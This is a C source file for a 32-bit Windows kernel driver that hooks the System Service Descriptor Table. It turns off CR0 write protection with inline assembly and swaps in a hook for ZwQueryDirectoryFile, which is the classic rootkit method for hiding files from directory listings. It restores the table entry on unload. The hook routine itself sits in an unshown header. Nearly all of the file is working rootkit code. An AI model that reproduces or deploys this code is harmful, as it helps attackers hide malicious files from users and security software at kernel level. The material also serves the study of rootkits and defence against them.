#include "Header.h"

NTSTATUS Unsupported(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
void Unload(PDRIVER_OBJECT pDriverObject);
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);

#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, Unload)
#pragma alloc_text(PAGE, Unsupported)


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	DbgPrint("DriverEntry called.\n");

	NTSTATUS NtStatus = STATUS_SUCCESS;
	PDEVICE_OBJECT pDeviceObject = NULL;
	UNICODE_STRING usDriverName, usDosDeviceName;


	RtlInitUnicodeString(&usDriverName, L"\\Device\\SSDTHook");
	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\SSDTHook");

	NtStatus = IoCreateDevice(pDriverObject, 0, &usDriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);

	if (NtStatus == STATUS_SUCCESS) {
		for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
			pDriverObject->MajorFunction[i] = Unsupported;
		}

		pDriverObject->DriverUnload = Unload;
		pDeviceObject->Flags |= 0;
		pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);

		IoCreateSymbolicLink(&usDosDeviceName, &usDriverName);

		/* hook SSDT */
		originalZwQueryDirectoryFile = (ZwQueryDirectoryFilePtr)HookSSDT((PULONG)ZwQueryDirectoryFile, (PULONG)Hook_ZwQueryDirectoryFile);
	}

	DbgPrint("Driver Loaded.\n");
	return NtStatus;

}

PULONG HookSSDT(PUCHAR function, PUCHAR hookAddress) {
	DbgPrint("HookSSDT called.\n");

	PUCHAR ret;

	disableWriteProtect();

	// syscall: mov eax, <indexOfFunction>
	ULONG index = *((PULONG)(function + 0x1));
	ret = InterlockedExchange(&KeServiceDescriptorTable.ServiceTableBase[index], hookAddress);

	enableWriteProtect();

	return ret;
}

void disableWriteProtect() {
	__asm{
		mov eax, cr0
		and eax, not 0x10000
		mov cr0, eax
	}
}

void enableWriteProtect() {
	__asm{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
	}
}

void Unload(PDRIVER_OBJECT pDriverObject) {
	DbgPrint("Unload routine called.\n");

	UNICODE_STRING usDosDeviceName;

	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\SSDTHook");

	IoDeleteSymbolicLink(&usDosDeviceName);

	IoDeleteDevice(pDriverObject->DeviceObject);

	// Unhook the SSDT.
	if (originalZwQueryDirectoryFile != NULL) {
		originalZwQueryDirectoryFile = (ZwQueryDirectoryFilePtr)HookSSDT((PULONG)ZwQueryDirectoryFile, (PULONG)originalZwQueryDirectoryFile);
		DbgPrint("ZwQueryDirectoryFile unhooked.\n");
	}
}

NTSTATUS Unsupported(PDEVICE_OBJECT pDeviceObject, PIRP Irp) {
	DbgPrint("Unsupported Function. Returning STATUS_SUCCESS\n");
	return STATUS_SUCCESS;
}

